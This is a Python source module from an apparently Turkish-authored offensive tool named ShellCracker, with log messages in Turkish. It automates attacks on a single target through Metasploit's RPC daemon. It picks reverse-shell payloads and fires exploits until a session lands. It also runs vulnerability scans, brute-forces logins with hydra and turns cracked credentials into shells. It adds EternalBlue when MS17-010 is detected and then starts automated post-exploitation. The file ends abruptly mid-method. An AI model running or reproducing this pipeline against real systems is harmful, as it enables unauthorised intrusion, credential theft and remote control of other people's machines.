"""Execution: drive Metasploit over msfrpc to validate and fire candidates.

Responsibilities:

* Connect to a running ``msfrpcd`` (and fail with a clear, actionable message
  if it is not reachable -- ShellCracker never starts services for you).
* For each candidate exploit: select a compatible reverse payload, optionally
  run ``check()`` as a dry-run, set up the reverse handler, fire once, and wait
  for a session.
* Verify any session that lands by running a harmless command, capture proof,
  and clean up sessions/jobs that ShellCracker itself started.

The executor only ever touches the single target address handed to it.
"""

from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any

from .matcher import ExploitCandidate
from .strategy import AttackPlan, AttackVector, Finding, PHASES, StrategyEngine

logger = logging.getLogger("ShellCracker.executor")


class MsfConnectionError(RuntimeError):
    """Raised when msfrpcd cannot be reached; message tells the user how to start it."""


@dataclass
class AttemptRecord:
    """Audit record for a single exploit attempt."""

    module: str
    payload: str = ""
    lport: int | None = None
    parameters: dict[str, Any] = field(default_factory=dict)
    check_result: str = "not-run"
    fired: bool = False
    success: bool = False
    session_id: int | None = None
    session_type: str = ""
    proof: str = ""
    reason: str = ""
    started_at: str = ""
    finished_at: str = ""
    # Autonomous-engine metadata (empty for the legacy path).
    phase: str = "exploit"
    kind: str = "exploit"
    score: float = 0.0
    rationale: str = ""
    findings: list[str] = field(default_factory=list)
    output: str = ""
    postexp: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        # Drop internal attributes (e.g. the raw Finding objects cached for the
        # adaptive loop) so the record stays JSON-serialisable.
        return {k: v for k, v in self.__dict__.items() if not k.startswith("_")}


def connect(
    host: str,
    port: int,
    user: str,
    password: str,
    ssl: bool = True,
) -> Any:
    """Connect to msfrpcd and return a pymetasploit3 client.

    Raises:
        MsfConnectionError: If the daemon is unreachable, with the exact
            command the user should run to start it.
    """
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
    except ImportError as exc:  # pragma: no cover - dependency guard
        raise MsfConnectionError(
            "pymetasploit3 kurulu degil. Calistir: pip install -r requirements.txt"
        ) from exc

    try:
        client = MsfRpcClient(
            password, username=user, server=host, port=port, ssl=ssl
        )
        # Touch the API to confirm the handshake really worked.
        _ = client.core.version
    except Exception as exc:  # noqa: BLE001 - surface a friendly hint
        start_cmd = f"msfrpcd -U {user} -P {password} -p {port} -a {host}"
        if not ssl:
            start_cmd += " -S"  # -S disables SSL
        raise MsfConnectionError(
            f"msfrpcd'ye baglanilamadi ({host}:{port}, ssl={ssl}): {exc}\n\n"
            "ShellCracker Metasploit servislerini senin yerine baslatmaz. RPC "
            "servisini baska bir terminalde baslat ve tekrar dene:\n\n"
            f"    {start_cmd}\n"
        ) from exc

    logger.info(
        "msfrpcd baglantisi kuruldu %s (framework %s)",
        f"{host}:{port}",
        client.core.version.get("version", "?"),
    )
    return client


def start_msfrpcd(
    host: str, port: int, user: str, password: str, ssl: bool = True
) -> subprocess.Popen:
    """Launch msfrpcd and return the process handle.

    ``-f`` runs it in the FOREGROUND so the returned Popen handle *is* the real
    daemon. Without it msfrpcd double-forks and the parent exits 0 within a
    second -- which looks exactly like a crash to ``poll()`` even though the
    listener is (slowly) coming up. stdout/stderr are captured so that, if it
    genuinely dies, we can show the user why instead of a bare exit code.
    """
    cmd = ["msfrpcd", "-f", "-U", user, "-P", password, "-p", str(port), "-a", host]
    if not ssl:
        cmd.append("-S")  # -S disables SSL
    logger.info("msfrpcd baslatiliyor: %s", " ".join(cmd))
    # Send output to a log file rather than a PIPE: msfrpcd runs for the whole
    # session with -f, and an unread PIPE would fill (~64KB) and deadlock it.
    # The file lets us show the startup error if it dies early.
    log = tempfile.NamedTemporaryFile(
        prefix="shellcracker_msfrpcd_", suffix=".log", delete=False, mode="w"
    )
    proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT, text=True)
    proc._sc_logpath = log.name  # type: ignore[attr-defined]
    log.close()
    return proc


def connect_or_start(
    host: str,
    port: int,
    user: str,
    password: str,
    ssl: bool = True,
    boot_timeout: int = 150,
) -> tuple[Any, subprocess.Popen | None]:
    """Connect to msfrpcd, auto-starting the daemon if it is not running.

    Returns:
        ``(client, started_proc)`` where ``started_proc`` is the process this
        function spawned, or ``None`` if a daemon was already running.

    Raises:
        MsfConnectionError: If msfrpcd is not installed, dies on startup, or
            does not become reachable within ``boot_timeout`` seconds.
    """
    # Reuse an already-running daemon if there is one.
    try:
        return connect(host, port, user, password, ssl), None
    except MsfConnectionError:
        logger.info("Calisan msfrpcd bulunamadi; otomatik baslatiliyor.")

    if shutil.which("msfrpcd") is None:
        raise MsfConnectionError(
            "msfrpcd PATH'te bulunamadi. Metasploit kurulu mu?\n"
            "    Kurulum: sudo apt install metasploit-framework"
        )

    proc = start_msfrpcd(host, port, user, password, ssl)
    logger.info("  Metasploit framework yukleniyor; bu ilk acilista uzun "
                "surebilir (en fazla %d sn bekleniyor)...", boot_timeout)
    deadline = time.time() + boot_timeout
    last_err = ""
    while time.time() < deadline:
        if proc.poll() is not None:
            # With -f the daemon runs in the foreground, so an early exit is a
            # real failure -- show its own output, which usually names the cause
            # (missing DB, bad password, port already bound, ...).
            out = ""
            logpath = getattr(proc, "_sc_logpath", "")
            if logpath:
                try:
                    with open(logpath, encoding="utf-8", errors="replace") as fh:
                        out = fh.read()
                except Exception:  # noqa: BLE001
                    out = ""
            detail = out.strip().splitlines()[-5:] if out.strip() else []
            msg = (
                f"msfrpcd baslatildi ama beklenmedik sekilde kapandi "
                f"(cikis kodu {proc.returncode})."
            )
            if detail:
                msg += "\n    msfrpcd ciktisi:\n      " + "\n      ".join(detail)
            else:
                msg += ("\n    'msfrpcd -f -U msf -P msf -p 55553 -a 127.0.0.1' "
                        "komutunu elle calistirip hatayi gorebilirsin.")
            msg += ("\n    Sik neden: Metasploit veritabani kurulmamis -> "
                    "'sudo msfdb init' calistir.")
            raise MsfConnectionError(msg)
        try:
            client = connect(host, port, user, password, ssl)
            logger.info("msfrpcd otomatik baslatildi ve baglanildi.")
            return client, proc
        except MsfConnectionError as exc:
            last_err = str(exc).splitlines()[0]
            time.sleep(3)

    try:
        proc.terminate()
    except Exception:  # noqa: BLE001
        pass
    raise MsfConnectionError(
        f"msfrpcd {boot_timeout} sn icinde hazir olmadi. Son hata: {last_err}"
    )


def _select_payload(exploit: Any, preferences: dict[str, str]) -> str:
    """Choose a reverse payload compatible with ``exploit``.

    Preference order:
        1. The first configured per-platform payload that the module lists as
           compatible.
        2. Any compatible meterpreter ``reverse_tcp`` payload.
        3. Any compatible generic reverse shell.
        4. The module's first compatible payload (last resort).
    """
    try:
        compatible = list(exploit.payloads)
    except Exception:  # noqa: BLE001 - some modules expose no payload list
        compatible = []

    if not compatible:
        # Fall back to the configured generic payload and hope the module accepts it.
        return preferences.get("generic", "generic/shell_reverse_tcp")

    compatible_set = set(compatible)

    for key in ("linux_x64", "linux_x86", "windows_x64", "windows_x86", "generic"):
        candidate = preferences.get(key)
        if candidate and candidate in compatible_set:
            return candidate

    for p in compatible:
        if "meterpreter" in p and "reverse_tcp" in p:
            return p
    for p in compatible:
        if "reverse" in p:
            return p
    return compatible[0]


def _run_check(exploit: Any) -> str:
    """Run a module's ``check()`` as a dry-run. Returns a short status string."""
    try:
        result = exploit.check()
    except Exception as exc:  # noqa: BLE001 - many modules have no check
        return f"unsupported/error: {exc}"
    if isinstance(result, dict):
        return str(result.get("code") or result.get("message") or result)
    return str(result)


def _verify_session(client: Any, sid: int) -> tuple[bool, str, str]:
    """Run a harmless command in session ``sid`` to prove it is live.

    Returns:
        (ok, session_type, proof_output)
    """
    try:
        meta = client.sessions.list.get(str(sid)) or client.sessions.list.get(sid) or {}
        stype = meta.get("type", "")
        session = client.sessions.session(sid)
        if stype == "meterpreter":
            session.runsingle("getuid")
            time.sleep(1)
            proof = session.read() or ""
            if not proof.strip():
                proof = session.run_with_output("sysinfo", timeout=15)
        else:
            session.write("id; uname -a\n")
            time.sleep(2)
            proof = session.read() or ""
        return bool(proof.strip()), stype, proof.strip()
    except Exception as exc:  # noqa: BLE001 - verification is best-effort
        return False, "", f"dogrulama hatasi: {exc}"


class Executor:
    """Validates and fires exploit candidates against a single target."""

    def __init__(self, client: Any, target: str, config: dict[str, Any]) -> None:
        self.client = client
        self.target = target
        self.config = config
        self.handler = config.get("handler", {})
        self.exec_cfg = config.get("execution", {})
        self.payload_prefs = config.get("payloads", {})
        # Sessions ShellCracker opened, so Ctrl+C / cleanup only touches our own.
        self._owned_sessions: set[int] = set()
        self._next_lport = int(self.handler.get("lport_range", [4444, 4454])[0])

    def _pick_lport(self) -> int:
        lo, hi = self.handler.get("lport_range", [4444, 4454])
        lport = self._next_lport
        self._next_lport += 1
        if self._next_lport > int(hi):
            self._next_lport = int(lo)
        return lport

    def _current_session_ids(self) -> set[int]:
        try:
            return {int(k) for k in self.client.sessions.list.keys()}
        except Exception:  # noqa: BLE001
            return set()

    def try_candidate(self, candidate: ExploitCandidate) -> AttemptRecord:
        """Legacy path: validate+fire a single :class:`ExploitCandidate` once."""
        return self._fire_exploit(
            module=candidate.module,
            port=candidate.service_port,
            rank=candidate.rank,
        )

    def _fire_exploit(
        self,
        module: str,
        port: int,
        extra_options: dict[str, Any] | None = None,
        rank: str = "",
        record: AttemptRecord | None = None,
    ) -> AttemptRecord:
        """Validate (optional) and fire a single exploit module once.

        ``extra_options`` are set on the exploit before firing (e.g. SMBUser /
        SMBPass for psexec). Returns an :class:`AttemptRecord` describing
        exactly what happened, whether or not a session was obtained.
        """
        if record is None:
            record = AttemptRecord(module=module)
        record.started_at = datetime.now().isoformat(timespec="seconds")
        record.kind = "exploit"
        record.phase = "exploit"
        logger.info("=== Exploit: exploit/%s%s ===", module,
                    f" (rank={rank})" if rank else "")

        try:
            exploit = self.client.modules.use("exploit", module)
        except Exception as exc:  # noqa: BLE001 - module missing/renamed
            record.reason = f"modul yuklenemedi: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.warning("  atlaniyor: %s", record.reason)
            return record

        # Target + port + any extra module options (creds, etc.).
        try:
            exploit["RHOSTS"] = self.target
            if port:
                exploit["RPORT"] = port
            for k, v in (extra_options or {}).items():
                if k.startswith("_") or k in ("RHOSTS", "RPORT"):
                    continue
                try:
                    exploit[k] = v
                except Exception:  # noqa: BLE001 - module may not accept it
                    logger.debug("  %s secenegi atlandi", k)
        except Exception as exc:  # noqa: BLE001
            record.reason = f"hedef secenekleri ayarlanamadi: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            return record

        # Payload + reverse handler.
        payload = _select_payload(exploit, self.payload_prefs)
        lport = self._pick_lport()
        lhost = self.handler.get("lhost", "")
        record.payload = payload
        record.lport = lport
        record.parameters = {
            "RHOSTS": self.target, "RPORT": port, "PAYLOAD": payload,
            "LHOST": lhost, "LPORT": lport,
            **{k: v for k, v in (extra_options or {}).items()
               if not k.startswith("_") and k not in ("RHOSTS", "RPORT")},
        }

        # Dry-run check if enabled and supported.
        if self.exec_cfg.get("check_before_fire", True):
            record.check_result = _run_check(exploit)
            logger.info("  check(): %s", record.check_result)
            low = record.check_result.lower()
            if "not vulnerable" in low or low == "safe":
                record.reason = f"check hedefi savunmasiz bulmadi ({record.check_result})"
                record.finished_at = datetime.now().isoformat(timespec="seconds")
                logger.info("  atlaniyor: %s", record.reason)
                return record

        try:
            payload_obj = self.client.modules.use("payload", payload)
            payload_obj["LHOST"] = lhost
            payload_obj["LPORT"] = lport
        except Exception as exc:  # noqa: BLE001
            record.reason = f"payload kurulumu basarisiz: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            return record

        before = self._current_session_ids()
        logger.info("  atesleniyor: %s  LHOST=%s LPORT=%s", payload, lhost, lport)
        try:
            exploit.execute(payload=payload_obj)
            record.fired = True
        except Exception as exc:  # noqa: BLE001 - target not suitable, etc.
            record.reason = f"execute() basarisiz: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.warning("  %s", record.reason)
            return record

        sid = self._wait_for_session(before, timeout=25)
        if sid is None:
            record.reason = "sure icinde oturum acilmadi"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.info("  %s", record.reason)
            return record

        self._owned_sessions.add(sid)
        ok, stype, proof = _verify_session(self.client, sid)
        record.session_id = sid
        record.session_type = stype
        record.proof = proof
        record.success = ok
        record.reason = (
            "oturum dogrulandi" if ok
            else "oturum acildi ama dogrulama cikti uretmedi"
        )
        record.finished_at = datetime.now().isoformat(timespec="seconds")
        logger.info("  OTURUM %s (%s) basari=%s", sid, stype or "?", ok)
        if proof:
            logger.info("  kanit:\n%s", proof)
        return record

    def _wait_for_session(self, before: set[int], timeout: int = 25) -> int | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            now = self._current_session_ids()
            new = now - before
            if new:
                return sorted(new)[0]
            time.sleep(2)
        return None

    def run(self, candidates: list[ExploitCandidate]) -> list[AttemptRecord]:
        """Try candidates in order until a session lands or the budget runs out."""
        max_attempts = int(self.exec_cfg.get("max_attempts", 5))
        delay = int(self.exec_cfg.get("delay_between_attempts", 10))
        records: list[AttemptRecord] = []

        for i, candidate in enumerate(candidates[:max_attempts], start=1):
            logger.info("Deneme %d/%d", i, min(max_attempts, len(candidates)))
            record = self.try_candidate(candidate)
            records.append(record)
            if record.success:
                logger.info("Shell alindi -- aday dongusu durduruluyor.")
                break
            if i < min(max_attempts, len(candidates)):
                logger.info("Sonraki denemeden once %d sn bekleniyor...", delay)
                time.sleep(delay)

        return records

    # ================================================================== #
    #  Autonomous engine: auxiliary/login execution + adaptive plan loop  #
    # ================================================================== #

    def _console_run(self, commands: list[str], max_wait: int = 90) -> str:
        """Run console commands in a throwaway msf console and return output.

        Used for auxiliary/login modules, whose human-readable output (login
        successes, share lists, vuln verdicts) is easiest to capture and parse
        from the console rather than the RPC job API.
        """
        try:
            console = self.client.consoles.console()
        except Exception as exc:  # noqa: BLE001
            return f"[console acilamadi: {exc}]"

        out = ""
        try:
            for cmd in commands:
                console.write(cmd)
            deadline = time.time() + max_wait
            idle = 0
            while time.time() < deadline:
                time.sleep(1)
                try:
                    chunk = console.read()
                except Exception:  # noqa: BLE001
                    break
                data = chunk.get("data", "") if isinstance(chunk, dict) else ""
                busy = chunk.get("busy", False) if isinstance(chunk, dict) else False
                if data:
                    out += data
                    idle = 0
                else:
                    idle += 1
                # Stop once the module is done and output has settled.
                if not busy and idle >= 2:
                    break
        finally:
            try:
                self.client.consoles.destroy(console.cid)
            except Exception:  # noqa: BLE001 - best-effort teardown
                pass
        return out

    def _materialize_credfiles(self, options: dict[str, Any]) -> tuple[dict[str, Any], list[str]]:
        """Turn internal ``_users``/``_passwords`` lists into msf USER/PASS files.

        Returns (clean_options, tempfile_paths_to_remove).
        """
        opts = {k: v for k, v in options.items() if not k.startswith("_")}
        tmpfiles: list[str] = []
        users = options.get("_users")
        passwords = options.get("_passwords")
        if users:
            fd, path = tempfile.mkstemp(prefix="sc_users_", suffix=".txt")
            with os.fdopen(fd, "w", encoding="utf-8") as fh:
                fh.write("\n".join(users))
            opts["USER_FILE"] = path
            tmpfiles.append(path)
        if passwords:
            fd, path = tempfile.mkstemp(prefix="sc_pass_", suffix=".txt")
            with os.fdopen(fd, "w", encoding="utf-8") as fh:
                # msf treats an empty line as a blank password.
                fh.write("\n".join(passwords))
            opts["PASS_FILE"] = path
            tmpfiles.append(path)
        return opts, tmpfiles

    _CRED_RE = re.compile(r"Success:\s*'([^':]*):([^']*)'")
    _LOGIN_RE = re.compile(r"(?i)(login successful|successful login|valid credentials)")

    def _parse_findings(self, vector: AttackVector, output: str) -> list[Finding]:
        """Extract actionable findings from auxiliary/login module output."""
        findings: list[Finding] = []
        low = output.lower()

        # Credentials (msf prints "Success: 'user:pass'").
        for m in self._CRED_RE.finditer(output):
            findings.append(Finding(
                key="creds", value=(m.group(1), m.group(2)),
                port=vector.service_port, category=vector.category,
                detail="login scanner",
            ))
        if not findings and vector.kind == "login" and self._LOGIN_RE.search(output):
            findings.append(Finding(
                key="creds", value=("<goruldu>", ""),
                port=vector.service_port, category=vector.category,
                detail="login basarili (ayristirilamadi)",
            ))

        # MS17-010 verdict.
        if "ms17_010" in vector.module and (
            "is likely vulnerable" in low or "vulnerable to ms17-010" in low
            or "the target is vulnerable" in low
        ):
            findings.append(Finding(key="smb.ms17_010", value=True,
                                    port=vector.service_port, category="smb"))

        # Anonymous FTP.
        if "anonymous" in vector.module and (
            "anonymous read" in low or "230 login successful" in low
            or "anonymous access allowed" in low
        ):
            findings.append(Finding(key="ftp.anonymous", value=True,
                                    port=vector.service_port, category="ftp"))

        # SMB null session / readable shares.
        if "enumshares" in vector.module and ("readable" in low or "share" in low):
            findings.append(Finding(key="smb.null_session", value=True,
                                    port=vector.service_port, category="smb"))
        return findings

    def _run_aux_vector(self, vector: AttackVector) -> AttemptRecord:
        """Run an auxiliary/login module via the console and parse findings."""
        record = AttemptRecord(
            module=vector.module, kind=vector.kind, phase=vector.phase,
            score=vector.score, rationale=vector.rationale,
            started_at=datetime.now().isoformat(timespec="seconds"),
        )
        logger.info("=== %s: auxiliary/%s (skor=%.0f) ===",
                    vector.kind.upper(), vector.module, vector.score)

        options, tmpfiles = self._materialize_credfiles(vector.options)
        record.parameters = {k: v for k, v in options.items()}

        before = self._current_session_ids()
        commands = [f"use auxiliary/{vector.module}\n"]
        for key, val in options.items():
            commands.append(f"set {key} {val}\n")
        commands.append("run\n")

        try:
            output = self._console_run(commands)
            record.fired = True
        except Exception as exc:  # noqa: BLE001
            record.reason = f"auxiliary calistirilamadi: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            return record
        finally:
            for path in tmpfiles:
                try:
                    os.remove(path)
                except OSError:
                    pass

        record.output = output[-4000:]  # keep the tail for the report
        found = self._parse_findings(vector, output)
        record.findings = [f"{f.key}={f.value}" for f in found]
        record._findings_obj = found  # type: ignore[attr-defined]

        # A login scanner with CreateSession may have dropped a live session.
        new_sids = self._current_session_ids() - before
        if new_sids:
            sid = sorted(new_sids)[0]
            self._owned_sessions.add(sid)
            ok, stype, proof = _verify_session(self.client, sid)
            record.session_id = sid
            record.session_type = stype
            record.proof = proof
            record.success = ok
            record.reason = "kimlik dogrulama ile oturum alindi"
            logger.info("  OTURUM %s (%s) — kimlikle", sid, stype or "?")
        elif found:
            record.reason = f"{len(found)} bulgu: " + ", ".join(record.findings)
            logger.info("  bulgu: %s", record.reason)
        else:
            record.reason = "bulgu yok"
        record.finished_at = datetime.now().isoformat(timespec="seconds")
        return record

    def execute_vector(self, vector: AttackVector) -> AttemptRecord:
        """Dispatch a vector to the right executor by kind."""
        vector.done = True
        if vector.kind == "exploit":
            rec = self._fire_exploit(
                module=vector.module, port=vector.service_port,
                extra_options=vector.options,
            )
            rec.phase, rec.kind = vector.phase, vector.kind
            rec.score, rec.rationale = vector.score, vector.rationale
            return rec
        return self._run_aux_vector(vector)

    def run_plan(self, plan: AttackPlan, engine: StrategyEngine) -> list[AttemptRecord]:
        """Execute the plan phase by phase, feeding findings back to the engine.

        Order: enumerate -> exploit -> credentials -> misconfig (configurable).
        Enumeration/credential findings are passed to ``engine.incorporate``,
        which may boost queued vectors or inject new ones (e.g. EternalBlue once
        MS17-010 is confirmed), realising the adaptive decision loop.
        """
        scfg = self.config.get("strategy", {}) or {}
        phases = scfg.get("phases", list(PHASES))
        stop_on_shell = bool(scfg.get("stop_on_first_shell", True))
        budgets = {
            "exploit": int(scfg.get("max_exploit_attempts", 8)),
            "enumerate": int(scfg.get("max_enum_modules", 14)),
            "credentials": int(scfg.get("max_credential_attempts", 6)),
            "misconfig": int(scfg.get("max_misconfig_attempts", 6)),
        }
        records: list[AttemptRecord] = []
        delay = int(self.exec_cfg.get("delay_between_attempts", 5))

        for phase in phases:
            # The vuln-scan phase runs external tools (web fingerprint, nuclei,
            # dir brute, nikto) rather than MSF vectors; its findings are fed
            # back into the engine, widening the exploit phase that follows.
            if phase == "vulnscan":
                self._run_vulnscan(engine, records)
                continue
            if phase == "bruteforce":
                if self._run_bruteforce(engine, records):
                    if stop_on_shell:
                        return records
                continue

            spent = 0
            # pending() is re-queried each iteration so adaptively-injected
            # vectors (added mid-phase) are picked up and re-sorted by score.
            while spent < budgets.get(phase, 6):
                queue = plan.pending(phase)
                if not queue:
                    break
                vector = queue[0]
                spent += 1
                logger.info("[%s %d/%d] %s/%s",
                            phase, spent, budgets.get(phase, 6),
                            vector.module_type, vector.module)
                record = self.execute_vector(vector)
                records.append(record)

                # Adaptive feedback from enumeration/credential findings. A bug
                # while digesting a finding must never abort the exploitation
                # run -- isolate it so the plan keeps going with what it has.
                found = getattr(record, "_findings_obj", None)
                if found:
                    try:
                        new_vectors = engine.incorporate(found)
                    except Exception as exc:  # noqa: BLE001
                        logger.warning("Bulgular islenirken hata (atlandi): %s", exc)
                        new_vectors = []
                    for nv in new_vectors:
                        logger.info("  +adaptif: %s (skor=%.0f) — %s",
                                    nv.module, nv.score, nv.rationale)

                if record.success:
                    logger.info("Oturum alindi (%s fazi).", phase)
                    self._post_exploit(record, engine)
                    if stop_on_shell:
                        return records
                if spent < budgets.get(phase, 6) and plan.pending(phase):
                    time.sleep(delay)

        return records

    def _run_vulnscan(self, engine: StrategyEngine, records: list[AttemptRecord]) -> None:
        """Active external-tool vuln / attack-surface scan feeding the plan.

        Three independent intel passes, each optional and each fed back through
        ``engine.incorporate`` so what it finds becomes scored exploit vectors
        *before* the exploit phase runs:

          * NSE  -- ``nmap --script vuln,vulners`` -> confirmed CVEs / MS17-010
                    turned into their exact Metasploit modules;
          * SMB  -- netexec null-session shares, RID user enumeration, and any
                    anonymous/``Pwn3d!`` credential -> psexec shell path;
          * web  -- whatweb / nuclei / gobuster|ffuf / nikto fingerprints.

        Any tool that is not installed is skipped; a tool error never stops the
        run. One ``incorporate`` call at the end widens the exploit phase.
        """
        all_findings: list[Finding] = []
        all_findings += self._nse_scan(engine, records)
        all_findings += self._smb_enum(engine, records)
        all_findings += self._web_enum(engine, records)

        if all_findings:
            try:
                new_vectors = engine.incorporate(all_findings)
            except Exception as exc:  # noqa: BLE001 - never let it break the run
                logger.warning("vulnscan bulgulari islenirken hata (atlandi): %s", exc)
                new_vectors = []
            for nv in new_vectors:
                logger.info("  +vulnscan->plan: %s (skor=%.0f) — %s",
                            nv.module, nv.score, nv.rationale)
            logger.info("vulnscan: toplam %d bulgu, plana %d yeni vektor eklendi.",
                        len(all_findings), len(new_vectors))
        else:
            logger.info("vulnscan: bulgu yok (araclar kurulu degil ya da temiz).")

    def _nse_scan(self, engine: StrategyEngine, records: list[AttemptRecord]) -> list[Finding]:
        """nmap NSE vuln/vulners pass over the open ports; return findings."""
        cfg = self.config.get("nse", {}) or {}
        if not cfg.get("enabled", True):
            return []
        try:
            from .nse import NseScanner
        except Exception as exc:  # noqa: BLE001
            logger.warning("NSE atlandi (yuklenemedi): %s", exc)
            return []
        scanner = NseScanner(self.target, self.config)
        if not scanner.tool_status():
            return []
        started = datetime.now().isoformat(timespec="seconds")
        try:
            findings = scanner.scan(engine.profile.services)
        except Exception as exc:  # noqa: BLE001 - a tool must never break the run
            logger.warning("  NSE hatasi: %s", exc)
            findings = []
        rec = AttemptRecord(
            module="nse/vuln", kind="vulnscan", phase="vulnscan",
            started_at=started,
            finished_at=datetime.now().isoformat(timespec="seconds"),
            fired=True, reason=f"{len(findings)} NSE bulgusu",
        )
        rec.findings = [f"{f.key}={f.value}" for f in findings][:60]
        records.append(rec)
        return findings

    def _smb_enum(self, engine: StrategyEngine, records: list[AttemptRecord]) -> list[Finding]:
        """netexec SMB/AD enumeration pass; return findings."""
        cfg = self.config.get("smbenum", {}) or {}
        if not cfg.get("enabled", True):
            return []
        try:
            from .smbenum import SmbEnumRunner
        except Exception as exc:  # noqa: BLE001
            logger.warning("smbenum atlandi (yuklenemedi): %s", exc)
            return []
        runner = SmbEnumRunner(self.target, self.config)
        if not runner.tool_status():
            return []
        started = datetime.now().isoformat(timespec="seconds")
        try:
            findings = runner.scan(engine.profile.services)
        except Exception as exc:  # noqa: BLE001 - a tool must never break the run
            logger.warning("  SMB/AD keşfi hatasi: %s", exc)
            findings = []
        rec = AttemptRecord(
            module="netexec/smb", kind="vulnscan", phase="vulnscan",
            started_at=started,
            finished_at=datetime.now().isoformat(timespec="seconds"),
            fired=True, reason=f"{len(findings)} SMB bulgusu",
        )
        rec.findings = [f"{f.key}={f.value}" for f in findings][:60]
        records.append(rec)
        return findings

    def _web_enum(self, engine: StrategyEngine, records: list[AttemptRecord]) -> list[Finding]:
        """whatweb / nuclei / dirscan / nikto over the web services; return findings."""
        cfg = self.config.get("webenum", {}) or {}
        if not cfg.get("enabled", True):
            return []
        web_svcs = engine.profile.categorized.get("web", [])
        if not web_svcs:
            return []
        try:
            from .webenum import WebEnumRunner
        except Exception as exc:  # noqa: BLE001
            logger.warning("web keşfi atlandi (webenum yuklenemedi): %s", exc)
            return []

        runner = WebEnumRunner(self.target, self.config)
        status = runner.tool_status()
        logger.info("web keşfi araclari -> %s",
                    ", ".join(f"{t}:{'VAR' if ok else 'yok'}"
                              for t, ok in status.items()))

        all_findings: list[Finding] = []
        limit = int(cfg.get("max_targets", 3))
        for svc in web_svcs[:limit]:
            started = datetime.now().isoformat(timespec="seconds")
            try:
                findings = runner.scan_service(svc)
            except Exception as exc:  # noqa: BLE001 - a tool must never break the run
                logger.warning("  web keşfi hatasi (port %s): %s", svc.port, exc)
                findings = []
            all_findings.extend(findings)
            rec = AttemptRecord(
                module=f"webenum@{svc.port}", kind="vulnscan", phase="vulnscan",
                started_at=started,
                finished_at=datetime.now().isoformat(timespec="seconds"),
                fired=True, reason=f"{len(findings)} web bulgusu (port {svc.port})",
            )
            rec.findings = [f"{f.key}={f.value}" for f in findings][:60]
            records.append(rec)
        return all_findings

    def _run_bruteforce(self, engine: StrategyEngine, records: list[AttemptRecord]) -> bool:
        """Hydra credential attacks; feed creds back and try for a direct shell.

        For each login-capable service hydra finds a credential on, the pair is
        (a) handed to ``engine.incorporate`` -- reused across services and used
        to unlock credential-gated exploits -- and (b) tried immediately against
        the service's MSF login module with ``CreateSession`` so a working
        credential becomes a shell right away. Returns True if a session landed.
        """
        cfg = self.config.get("bruteforce", {}) or {}
        if not cfg.get("enabled", True):
            logger.info("bruteforce kapali (bruteforce.enabled=false).")
            return False
        try:
            from .bruteforce import _HYDRA_SERVICE, BruteForcer
        except Exception as exc:  # noqa: BLE001
            logger.warning("bruteforce atlandi (yuklenemedi): %s", exc)
            return False

        bf = BruteForcer(self.target, self.config)
        if not bf.tool_status():
            logger.info("bruteforce atlandi: hydra kurulu degil.")
            return False

        profile = engine.profile
        all_creds: list[Finding] = []
        max_services = int(cfg.get("max_services", 6))
        count = 0
        got_shell = False

        for category in profile.categories():
            if category not in _HYDRA_SERVICE:
                continue  # hydra has no clean handler for this service
            for svc in profile.categorized.get(category, []):
                if count >= max_services:
                    break
                started = datetime.now().isoformat(timespec="seconds")
                try:
                    findings = bf.brute_service(category, svc)
                except Exception as exc:  # noqa: BLE001 - never break the run
                    logger.warning("  hydra hatasi (%s:%s): %s", category, svc.port, exc)
                    findings = []
                count += 1
                rec = AttemptRecord(
                    module=f"hydra/{category}@{svc.port}", kind="bruteforce",
                    phase="bruteforce", started_at=started,
                    finished_at=datetime.now().isoformat(timespec="seconds"),
                    fired=True, reason=f"{len(findings)} kimlik bulundu",
                )
                rec.findings = [f"{u}:{p}" for u, p in (f.value for f in findings)]
                records.append(rec)
                all_creds.extend(findings)

                # Turn a found credential straight into a session if the service
                # supports a login->session MSF module (ssh/ftp/telnet/smb/...).
                for f in findings:
                    user, pw = f.value
                    if self._try_login_session(engine, category, svc, user, pw, records):
                        got_shell = True
                        break
                if got_shell:
                    break
            if got_shell:
                break

        if all_creds:
            new_vectors = engine.incorporate(all_creds)
            for nv in new_vectors:
                logger.info("  +bruteforce->plan: %s (skor=%.0f) — %s",
                            nv.module, nv.score, nv.rationale)
            logger.info("bruteforce: %d kimlik, plana %d yeni vektor.",
                        len(all_creds), len(new_vectors))
        else:
            logger.info("bruteforce: kimlik bulunamadi.")
        return got_shell

    def _try_login_session(
        self, engine: StrategyEngine, category: str, svc: Any,
        user: str, pw: str, records: list[AttemptRecord],
    ) -> bool:
        """Fire the category's MSF login module with one cred to drop a session."""
        from .strategy import _LOGIN_MODULES

        module = _LOGIN_MODULES.get(category)
        if not module:
            return False
        vector = AttackVector(
            phase="bruteforce", kind="login", module=module,
            module_type="auxiliary", category=category,
            service_port=svc.port, service_name=getattr(svc, "name", ""),
            rationale=f"hydra kimligi ile oturum denemesi ({user})",
            options={
                "RHOSTS": self.target, "RPORT": svc.port,
                "STOP_ON_SUCCESS": True, "BLANK_PASSWORDS": False,
                "USER_AS_PASS": False, "VERBOSE": False, "CreateSession": True,
                "_users": [user], "_passwords": [pw],
            },
        )
        record = self.execute_vector(vector)
        records.append(record)
        if record.success:
            logger.info("Oturum alindi (bruteforce fazi, %s).", category)
            self._post_exploit(record, engine)
            return True
        return False

    def _post_exploit(self, record: AttemptRecord, engine: StrategyEngine) -> None:
        """Run the automated post-exploitation triage on a verified session."""
        if not self.config.get("post_exploitation", {}).get("enabled", True):
            return
        if record.session_id is None:
            return
        try:
            from .postexp import PostExploiter

            pe = PostExploiter(self.client, self.config).run(
                record.session_id, record.session_type, engine.profile
            )
            record.postexp = pe.to_dict()
            logger.info("Post-exploitation: %s", pe.summary())
        except Exception as exc:  # noqa: BLE001 - post-exp must never break the run
            logger.warning("Post-exploitation atlandi: %s", exc)

    def interact(self, sid: int) -> None:
        """Hand the terminal to session ``sid`` interactively (in-process)."""
        from .interactive import interactive_loop

